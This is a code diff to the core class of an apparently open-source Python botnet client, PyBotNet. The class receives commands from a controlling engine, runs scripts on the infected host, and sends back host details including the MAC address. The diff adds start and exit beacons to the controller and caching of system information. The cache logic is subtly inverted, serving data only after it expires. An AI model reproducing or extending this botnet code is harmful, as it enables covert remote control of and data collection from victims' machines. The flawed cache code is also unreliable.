@@ -5,7 +5,7 @@ from functools import wraps
 import platform
 import datetime
 import logging
-import inspect 
+import inspect
 import uuid
 import time
 import os
@@ -31,9 +31,10 @@ class BotNet:
         engine: "BaseEngine" = None,
         *,
         version: str = "0.1.0",
-        delay: int = 2,
-        debug: bool = False,
+        delay: int = 1.5,
         use_default_scripts: bool = True,
+        start_end_notify: bool = True,
+        debug: bool = False,
         **extra,
     ):
 
@@ -42,8 +43,15 @@ class BotNet:
         self.delay = delay
         self.engine = engine
         self.use_default_scripts = use_default_scripts
+        self.start_end_notify = start_end_notify
         self.scripts = {}
         self.__run_time = time.time()
+        self.__cashe = {
+            "system_info": {
+                "minimal": {"save_time": None, "data": None},
+                "full": {"save_time": None, "data": None},
+            }
+        }
 
         if self.use_default_scripts:
             self.scripts.update(**BotNet.default_scripts)
@@ -136,8 +144,31 @@ Docs: {__github_link__}
 
         return help_str
 
+    def _add_cashe(self, name, expier_secound, data):
+        self.__cashe.update({name: {"exp": time.time() + expier_secound, "data": data}})
+
+    def _get_cashe(self, name)-> tuple[bool, any]:
+        """return (is_cashe, data)"""
+        if self.__cashe.get(name):
+            if self.__cashe[name]["exp"] <= time.time():
+                return True, self.__cashe[name]["data"]
+            return False, None
+        return False, None
+
     def system_info(self, minimal=False):
         """return system info"""
+
+        # return cashe minimal if exist
+        if minimal:
+            is_cashe, data = self._get_cashe("minimal_system_info")
+            if is_cashe:
+                return data
+        # return cashe full if exist
+        else:
+            is_cashe, data = self._get_cashe("full_system_info")
+            if is_cashe:
+                return data
+
         minimal_info = {
             "scripts_name": list(self.scripts),
             "mac_addres": uuid.getnode(),
@@ -146,6 +177,8 @@ Docs: {__github_link__}
         }
 
         if minimal:
+            # save cashe minimal
+            self._add_cashe("minimal_system_info", 10, minimal_info)
             return minimal_info
 
         full_info = {
@@ -158,6 +191,10 @@ Docs: {__github_link__}
             "cpu_count": os.cpu_count(),
             "pybotnet_version": __version__,
         }
+
+        # save cashe full
+        self._add_cashe("full_system_info", 10, full_info)
+
         return full_info
 
     def _create_request(self, command: List, meta_data: Dict) -> Request:
@@ -165,7 +202,7 @@ Docs: {__github_link__}
         request.engine = self.engine
         request.command = command
         request.meta_data = meta_data
-        request.sytsem_data = self.system_info()
+        request.system_info = self.system_info
         request.time_stamp = datetime.datetime.now()
         return request
 
@@ -182,7 +219,7 @@ Docs: {__github_link__}
 
         return True
 
-    def run(self):
+    def _main_while(self):
         while True:
             try:
                 command = self.engine.receive()
@@ -209,7 +246,10 @@ Docs: {__github_link__}
                 _help_script_name = None
                 if len(command) > 1:
                     _help_script_name = command[1]
-                self.engine.send(self._help(_help_script_name), additionalـinfo=self.system_info(minimal=True))
+                self.engine.send(
+                    self._help(_help_script_name),
+                    additionalـinfo=self.system_info(minimal=True),
+                )
                 time.sleep(self.delay)
                 continue
 
@@ -239,22 +279,42 @@ Docs: {__github_link__}
                         script_result = script()
 
                 except UserException as e:
-                    script_result = e
+                    script_result = f"""UserException:
+                    script_name: {meta_data["script_name"]}
+                    script_version: {meta_data["script_version"]}
+                \n{e}"""
 
                 except Exception as e:
                     script_result = f"internal error \n\n{e}"
 
                 finally:
                     if not script_result == None:
-                        self.engine.send(script_result, additionalـinfo=self.system_info(minimal=True))
+                        self.engine.send(
+                            script_result,
+                            additionalـinfo=self.system_info(minimal=True),
+                        )
                     time.sleep(self.delay)
 
             else:
                 _logger.debug(f"<There is no script [{command[0]}] to execute>")
                 time.sleep(self.delay)
 
-    def import_scripts(self, external_scripts: "ExternalScripts"):
-        _logger.debug(f"import_scripts: {list(external_scripts.scripts.keys())} ")
+    def run(self):
+        if self.start_end_notify:
+            self.engine.send("Botnet Start", self.system_info())
+
+        try:
+            self._main_while()
+
+        except KeyboardInterrupt:
+            if self.start_end_notify:
+                self.engine.send("Botnet Exit", self.system_info())
+            return
+
+    def import_external_scripts(self, external_scripts: "ExternalScripts"):
+        _logger.debug(
+            f"import_external_scripts: {list(external_scripts.scripts.keys())} "
+        )
         self.scripts.update(**external_scripts.scripts)
 
 
